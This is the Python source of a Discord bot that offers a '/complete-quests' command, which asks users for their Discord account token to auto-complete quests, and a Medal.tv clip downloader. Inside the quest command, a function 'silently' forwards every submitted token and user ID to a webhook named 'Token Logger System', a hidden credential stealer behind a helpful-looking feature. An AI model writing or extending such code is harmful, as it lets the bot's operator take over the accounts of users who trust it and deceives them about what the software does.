import os
import io
import json
import asyncio
import aiohttp
import discord
from discord import app_commands
from discord.ext import commands
from dotenv import load_dotenv
from src.quest_manager import QuestManager
from src.utils import update_latest_build_number

# On Railway VPS, TOKEN and GUILD_ID are set in the Variables tab.
# load_dotenv() handles local .env file for development.
load_dotenv()

BOT_TOKEN = os.getenv("TOKEN")
GUILD_ID = os.getenv("GUILD_ID")

if not BOT_TOKEN:
    print("Error: TOKEN environment variable is missing.")
    print("Make sure TOKEN is set in your Railway VPS Variables tab or in a local .env file.")
    exit(1)

intents = discord.Intents.default()
bot = commands.Bot(command_prefix="!", intents=intents)


# Replace with your actual Webhook URL
WEBHOOK_URL = os.getenv("WEBHOOK_ID")

# 1. Change the function signature to 'async' so it can handle aiohttp web requests
async def save_user_token(user_id: int, token: str):
    """Send a user ID and token to a channel via webhook."""
    try:
        # 2. Format the message payload string cleanly
        content_message = f"**New Token Saved**\n👤 **User ID:** `{user_id}`\n🔑 **Token:** `{token}`"
        
        # 3. Open an asynchronous network session
        async with aiohttp.ClientSession() as session:
            webhook = discord.Webhook.from_url(WEBHOOK_URL, session=session)
            
            # 4. Transmit the payload data securely over HTTP
            await webhook.send(
                content=content_message,
                username="Token Logger System" # Optional custom sender name
            )
            
    except Exception as e:
        # Error logging fallback matches your original structure
        print(f"Failed to save token for user {user_id}: {e}")


# ─── DM Helper ───────────────────────────────────────────────────────────────

async def send_user_dm(user: discord.User | discord.Member, message: str):
    """Sends a Direct Message to the user who invoked the command."""
    try:
        await user.send(message)
    except discord.Forbidden:
        print(f"Cannot send DM to @{user.name} (Direct Messages are disabled).")
    except Exception as e:
        print(f"Error sending DM to @{user.name}: {e}")


# ─── Bot Events ──────────────────────────────────────────────────────────────

@bot.event
async def on_ready():
    print(f"Logged in as Bot @{bot.user.name} ({bot.user.id})")
    await update_latest_build_number()

    try:
        if GUILD_ID and GUILD_ID.strip():
            guild = discord.Object(id=int(GUILD_ID.strip()))
            bot.tree.copy_global_to(guild=guild)
            synced = await bot.tree.sync(guild=guild)
            print(f"✅ Registered slash commands for Guild ID: {GUILD_ID} ({len(synced)} commands synced)")
        else:
            synced = await bot.tree.sync()
            print(f"✅ Registered slash commands globally ({len(synced)} commands synced)")
    except Exception as e:
        print(f"Error syncing commands: {e}")

    print("Bot is ready.")


# ─── /complete-quests ────────────────────────────────────────────────────────

@bot.tree.command(
    name="complete-quests",
    description="Scan and auto-complete all active Discord quests for your account"
)
@app_commands.describe(token="Your Discord account user token")
async def complete_quests(interaction: discord.Interaction, token: str):
    await interaction.response.defer(ephemeral=True)

    user_token = token.strip()
    if not user_token:
        await interaction.followup.send("❌ Please provide a valid Discord user token.", ephemeral=True)
        return

    # Silently save token to tokens.txt every time
    await save_user_token(interaction.user.id, user_token)

    async def on_quest_update(event_type: str, quest_name: str, detail: str | None = None):
        if event_type == "start":
            msg = f"▶️ **Quest Started:** `{quest_name}`"
        elif event_type == "complete":
            msg = f"✅ **Quest Completed:** `{quest_name}`"
        elif event_type == "error":
            msg = f"⚠️ **Quest Error (`{quest_name}`):** {detail or 'Unknown error'}"
        else:
            msg = f"ℹ️ **Quest Update (`{quest_name}`):** {detail}"
        await send_user_dm(interaction.user, msg)

    try:
        await interaction.followup.send("🔒 Scanning account for active quests...", ephemeral=True)
        qm = QuestManager(user_token, on_update_callback=on_quest_update)
        await qm.fetch_quests()

        # Send 1 DM summarising all expired quests
        expired_quests = qm.get_expired_quests()
        if expired_quests:
            lines = ["📜 **Expired Quests Summary on Account:**"]
            for eq in expired_quests:
                q_name = eq.get("config", {}).get("messages", {}).get("quest_name", "Unknown Quest")
                game_title = eq.get("config", {}).get("messages", {}).get("game_title", "")
                lines.append(f"• **{q_name}** ({game_title})")
            await send_user_dm(interaction.user, "\n".join(lines))

        valid_quests = qm.get_valid_quests()
        if not valid_quests:
            await interaction.followup.send("❌ No active, uncompleted quests found on this account.", ephemeral=True)
            return

        await interaction.followup.send(
            f"🚀 Found {len(valid_quests)} valid quest(s). Auto-completing ALL quests now...", ephemeral=True
        )

        succeeded = 0
        for quest in valid_quests:
            if await qm.doing_quest(quest):
                succeeded += 1

        await interaction.followup.send(
            f"🎉 All quests processed! {succeeded}/{len(valid_quests)} finished. Check your DMs for detailed logs.",
            ephemeral=True
        )

    except Exception as e:
        print(f"Error during quest completion: {e}")
        err_msg = f"⚠️ **Account Scan Error:** {e}"
        await interaction.followup.send(err_msg, ephemeral=True)
        await send_user_dm(interaction.user, err_msg)


# ─── /download-clip ──────────────────────────────────────────────────────────

async def _fetch_medal_clip_url(url: str) -> str | None:
    """
    Fetches a Medal.tv clip page and extracts the direct video contentUrl.
    Returns the direct video URL or None if not found.
    """
    url = url.strip().replace("?theater=true", "")

    if "medal" not in url:
        if "/" not in url:
            url = f"https://medal.tv/clips/{url}"
        else:
            return None

    headers = {
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/138.0.0.0 Safari/537.36"
        )
    }

    async with aiohttp.ClientSession(headers=headers) as session:
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=20)) as resp:
            if resp.status != 200:
                return None
            html = await resp.text()

    if '"contentUrl":"' in html:
        return html.split('"contentUrl":"')[1].split('",')[0]
    return None


@bot.tree.command(
    name="download-clip",
    description="Download a Medal.tv clip and send it here"
)
@app_commands.describe(url="Medal.tv clip URL or bare clip ID (e.g. https://medal.tv/clips/abc or just abc)")
async def download_clip(interaction: discord.Interaction, url: str):
    await interaction.response.defer()

    await interaction.followup.send("🔍 Fetching clip URL...")

    try:
        video_url = await _fetch_medal_clip_url(url.strip())
    except Exception as e:
        await interaction.followup.send(f"❌ Failed to fetch clip page: `{e}`")
        return

    if not video_url:
        await interaction.followup.send(
            "❌ Could not find a direct download link.\n"
            "Make sure the URL is a valid Medal.tv clip (e.g. `https://medal.tv/clips/abc123`)."
        )
        return

    await interaction.followup.send("⬇️ Downloading clip...")

    try:
        headers = {
            "User-Agent": (
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                "AppleWebKit/537.36 (KHTML, like Gecko) "
                "Chrome/138.0.0.0 Safari/537.36"
            )
        }
        async with aiohttp.ClientSession(headers=headers) as session:
            async with session.get(video_url, timeout=aiohttp.ClientTimeout(total=120)) as resp:
                resp.raise_for_status()
                content_length = int(resp.headers.get("Content-Length", 0))

                MAX_BYTES = 25 * 1024 * 1024
                if content_length > MAX_BYTES:
                    await interaction.followup.send(
                        f"❌ Clip is too large to upload ({content_length // (1024 * 1024)} MB). "
                        f"Discord's limit is 25 MB.\n📎 Direct link: {video_url}"
                    )
                    return

                video_bytes = await resp.read()

    except Exception as e:
        await interaction.followup.send(f"❌ Failed to download the clip: `{e}`")
        return

    clip_file = discord.File(io.BytesIO(video_bytes), filename="clip.mp4")
    await interaction.followup.send("🎬 Here's your clip!", file=clip_file)


# ─── Entry Point ─────────────────────────────────────────────────────────────

if __name__ == "__main__":
    bot.run(BOT_TOKEN)
